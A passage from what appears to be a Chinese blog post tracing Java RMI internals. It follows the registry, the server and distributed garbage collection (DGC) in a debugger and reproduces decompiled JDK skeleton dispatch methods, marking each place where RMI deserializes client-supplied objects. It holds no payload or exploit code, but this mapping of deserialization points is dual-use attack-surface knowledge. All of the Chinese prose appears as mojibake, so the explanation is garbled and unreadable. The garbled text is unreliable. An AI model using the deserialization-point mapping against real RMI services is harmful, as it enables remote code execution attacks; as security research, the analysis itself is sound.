src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254006881-ee8d95c2-4ba6-4063-abc3-bb495d473834.png"></p><p>ä»listençš„æ–¹æ³•é‡Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹è·Ÿè¿›AcceptLoopçœ‹çœ‹é‡Œé¢çš„runæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254214420-0c41e6ea-9af0-4243-8fe6-76a0e8055b2d.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254262622-f2da88e3-6332-4d2f-96a1-81f3627511e4.png">å¯ä»¥çœ‹åˆ°è¿™é‡Œåˆåˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œå†çœ‹çœ‹ä»–çš„runæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254336732-488d7b7b-380b-4854-add4-c539491f198d.png"></p><p>å†çœ‹çœ‹run0</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254401964-9356a360-04fb-4ae2-a595-4c648e1c9bfb.png">é‡ç‚¹æ˜¯è°ƒç”¨äº†handleMessagesè¿™ä¸ªæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254548674-676cef27-9fa4-4293-a484-5b8a66ae928e.png"></p><p>é»˜è®¤ä¼šè°ƒç”¨è¿™ä¸ªserviceCallæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254591977-aefcdc90-e43a-45e3-9b45-f7186830a95d.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šä»Targetè·å–ä¸€äº›ä¸œè¥¿çœ‹çœ‹è¿™é‡Œé¢æœ‰ä»€ä¹ˆä¸œè¥¿,å…ˆä¸‹ä¸€ä¸ªæ–­ç‚¹ç„¶åä»å®¢æˆ·ç«¯è®¿é—®æ³¨å†Œä¸­å¿ƒçœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254836091-002ea0ff-71ed-47a3-b15e-833fc845cd7f.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æ–­ä½äº†ï¼Œç„¶åæˆ‘ä»¬çœ‹çœ‹Targeté‡Œæœ‰ä»€ä¹ˆ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254898542-68cc90dc-5adc-40be-87db-96d4d405d674.png">è¿™é‡Œå¯ä»¥çœ‹åˆ°é‡Œé¢ä¿å­˜çš„å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„<code>RegistryImpl_Stub</code>ï¼Œç„¶åç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732254956608-7f365c1a-a6d7-4791-9087-c6706ffda25c.png"></p><p>å¯ä»¥çœ‹åˆ°è·å–getDispatcherï¼ˆåˆ†å‘å™¨ï¼‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255049201-16f49f56-88ea-4085-bee5-52db7a7c6712.png"></p><p>åœ¨è¿™é‡Œé¢ä¿å­˜äº†skelï¼Œç„¶ååœ¨åé¢æ‰§è¡Œäº†<code>disp.dispatch(impl, call);</code>ï¼Œè·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255116879-d7868ac1-79a6-4658-9a13-f80620c730a1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255175150-1a59a586-8715-4ac1-abf9-00431bf992d6.png"></p><p>è¿™é‡Œskelä¸æ˜¯nullå°±ä¼šè°ƒç”¨oldDispatchè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255277532-72323e1c-d30f-4c6d-8ff5-1f5ac2fbb8a1.png"></p><p>è¿™é‡Œåˆè°ƒç”¨äº†dispatchç»§ç»­è·Ÿè¿›å»</p><h4 id="ååºåˆ—åŒ–6"><a href="#ååºåˆ—åŒ–6" class="headerlink" title="ååºåˆ—åŒ–6"></a>ååºåˆ—åŒ–6</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255489226-5955d0b8-17fa-4bc3-9fb8-f9874b35a02f.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢ä¼šæ ¹æ®å®¢æˆ·ç«¯çš„è°ƒç”¨æ–¹æ³•è¿›å…¥å¯¹åº”çš„caseï¼Œæ¯ä¸ªcaseé‡Œéƒ½æœ‰ååºåˆ—åŒ–ç‚¹è¿™é‡Œä»¥lookupä¸ºä¾‹ï¼Œä¸Šé—®åˆ†æå®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒçš„æ—¶å€™å¯ä»¥çŸ¥é“æˆ‘ä»¬è·å–è¿œç¨‹å¯¹è±¡åç§°æ˜¯åºåˆ—åŒ–ä¼ è¿‡å»çš„ï¼Œæ‰€ä»¥è¿™é‡Œè‡ªç„¶ä¼šååºåˆ—åŒ–è¯»å‡ºæ¥ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ã€‚</p><h3 id="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”æœåŠ¡ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”æœåŠ¡ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”æœåŠ¡ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”æœåŠ¡ç«¯</h3><p>è¿™é‡Œå’Œä¸Šæ–‡æåˆ°çš„è¯·æ±‚æ³¨å†Œä¸­å¿ƒçš„æµç¨‹åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç›´æ¥çœ‹ä¸åŒçš„ç‚¹å°±å¯ä»¥ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255820123-c75b9fa4-c83a-4eba-8606-52a3b90f2c3f.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ–­ä½äº†åŠ¨æ€ä»£ç†çš„stubï¼Œå®ƒä¹Ÿä¼šèµ°åˆ°dispatchæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255877543-b89eb034-b6eb-4ca3-8947-1d4f3825a13b.png"></p><p>ä¸è¿‡è¿™é‡Œä¸åŒçš„ä¸€ç‚¹æ˜¯skelä¸ºnull</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732255954199-6ad0561c-f63f-4f55-a339-7978dbf2cc39.png"></p><h4 id="ååºåˆ—åŒ–7"><a href="#ååºåˆ—åŒ–7" class="headerlink" title="ååºåˆ—åŒ–7"></a>ååºåˆ—åŒ–7</h4><p>æ‰€ä»¥ä¹Ÿå°±ä¸ä¼šèµ°åˆ°oldDispatché‡Œå»ç»§ç»­å¾€ä¸‹èµ°å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256176739-f765141c-5dcf-4724-bb3e-f583b0644ae0.png"></p><p>unmarshalValueè¿™ä¸ªæ–¹æ³•ä¸Šæ–‡ä¹‹å‰æåˆ°è¿‡ï¼Œè¿™é‡Œé¢æ˜¯æœ‰ååºåˆ—åŒ–ç‚¹çš„ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256249994-aed76566-89f6-40b5-b6cd-ac5f200d092c.png"></p><p>åŸç†å°±æ˜¯å°±æ˜¯å®¢æˆ·ç«¯ä¼šå°†å‚æ•°å€¼åºåˆ—åŒ–ä¼ è¿›å»ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿä¼šååºåˆ—åŒ–è¯»å‡ºæ¥<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256381493-719af0b7-aea5-4ecb-8e19-ab83032100ac.png"></p><p>å°±æ˜¯åœ¨å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯çš„æ–¹æ³•æ—¶å¦‚æœæœ‰å‚æ•°ä¼ å…¥ä¼šè¿›è¡Œåºåˆ—åŒ–ä¼ å…¥ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰å†™ä¼ å‚çš„ä¾‹å­ã€‚</p><h4 id="ååºåˆ—åŒ–8"><a href="#ååºåˆ—åŒ–8" class="headerlink" title="ååºåˆ—åŒ–8"></a>ååºåˆ—åŒ–8</h4><p>è¿™é‡Œç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256504362-644428dd-1941-4708-803d-570adb1b6cf8.png"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†marshalValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732256529735-312a35ab-4409-4aa8-8331-6a39dc0babe2.png"></p><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å°†è¿”å›å€¼åºåˆ—åŒ–ä¹‹åè¿”å›ç»™å®¢æˆ·ç«¯ï¼ŒåŒæ ·å®¢æˆ·ç«¯éœ€è¦ååºåˆ—åŒ–è¯»å‡ºæ¥ä¹Ÿæ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ã€‚</p><h3 id="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”DGC"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”DGC" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”DGC"></a>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”DGC</h3><p>DGC å«åšåˆ†å¸ƒå¼åƒåœ¾å›æ”¶ã€‚RMI ä½¿ç”¨ DGC æ¥åšè‡ªåŠ¨åƒåœ¾å›æ”¶ã€‚å› ä¸º RMI åŒ…å«äº†è·¨è™šæ‹Ÿæœºçš„è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼Œåƒåœ¾å›æ”¶æ˜¯å¾ˆå›°éš¾ çš„ã€‚DGC ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•æ¥ç»™è¿œç¨‹å¯¹è±¡æä¾›è‡ªåŠ¨å†…å­˜ç®¡ç†ã€‚</p><p>åœ¨å‰é¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬ä¹Ÿå‘ç°äº†æœ‰dgcè¿™ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯åœ¨åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æ—¶å€™Targeté‡Œæœ‰ä¸‰ä¸ªå¯¹è±¡</p><ul><li>è¿œç¨‹æœåŠ¡çš„åŠ¨æ€ä»£ç†Stubç±»</li><li>æ³¨å†Œä¸­å¿ƒçš„Stubç±»</li><li>DGCImpl_Stub</li></ul><p>è¿™é‡Œå…ˆå›åˆ°åˆ›å»ºè¿œç¨‹å¯¹è±¡putTarget</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257437379-841e39e9-9354-4889-a33a-0caac3f0b824.png"></p><p>æŒ‰ç…§ä¹‹å‰çš„æµç¨‹æ¥è¯´åœ¨targeté‡Œé¢æ”¾çš„è¿˜æ˜¯è¿œç¨‹å¯¹è±¡ï¼Œç„¶åå‘ä¸‹èµ°ï¼ŒæŒ‰ç…§æµç¨‹æ¥è¯´çš„è¯è¦èµ°åˆ°<code>objTable.put(oe, target);</code>è¿™é‡Œæ‰ä¼šæŠŠè¿œç¨‹å¯¹è±¡æ”¾è¿›å»ï¼Œä½†æ˜¯è¿˜æ²¡è¿›è¡Œçš„æ—¶å€™å…¶å®objTableé‡Œé¢å°±æ˜¯æ”¾è¿›å»äº†ä¸€ä¸ªå¯¹è±¡ä¹Ÿå°±æ˜¯DGCImpl_Stub</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257621294-d141c0a5-3a54-4250-8936-a6d5d841ff62.png"></p><p>åœ¨è¿›è¡Œputä¹‹å‰å¯ä»¥çœ‹åˆ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257642481-bf7e3227-dd36-4627-8051-ae2e1dfaac37.png"></p><p>è¿™é‡Œçœ‹ç€æ˜¯è°ƒç”¨äº†dgcLogå˜é‡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257863934-99d5b42b-5a2c-42e9-9922-a89d98444321.png"></p><p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°dgcLogå˜é‡æ˜¯é™æ€å˜é‡ï¼Œå¯¹é™æ€å˜é‡çš„è°ƒç”¨æ˜¯ä¼šè¿›è¡Œç±»çš„åˆå§‹åŒ–çš„ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732257954459-01aa69d5-3c5a-419d-ba1d-65fd2c621ba1.png"></p><p>è¿™é‡Œæ˜¯è¯¥ç±»çš„é™æ€ä»£ç å—ï¼Œå’Œä¹‹å‰åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„å¾ˆåƒå°±æ˜¯dgcçš„åˆ›å»ºæµç¨‹ã€‚</p><p>å®¢æˆ·ç«¯åœ¨è°ƒç”¨çš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·ä¹Ÿä¼šèµ°åˆ°dispatchæ–¹æ³•è¿™é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732258460734-334e5a09-2430-4455-8b59-e08163f681cc.png"></p><p>è¿™é‡Œä¼šèµ°åˆ°oldDispatché‡Œå’Œæ³¨å†Œä¸­å¿ƒçš„æµç¨‹ä¸€æ ·ï¼Œæœ€åéƒ½ä¼šèµ°åˆ°dispatchæ–¹æ³•é‡Œ</p><h4 id="ååºåˆ—åŒ–9"><a href="#ååºåˆ—åŒ–9" class="headerlink" title="ååºåˆ—åŒ–9"></a>ååºåˆ—åŒ–9</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="type">long</span> var8;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span 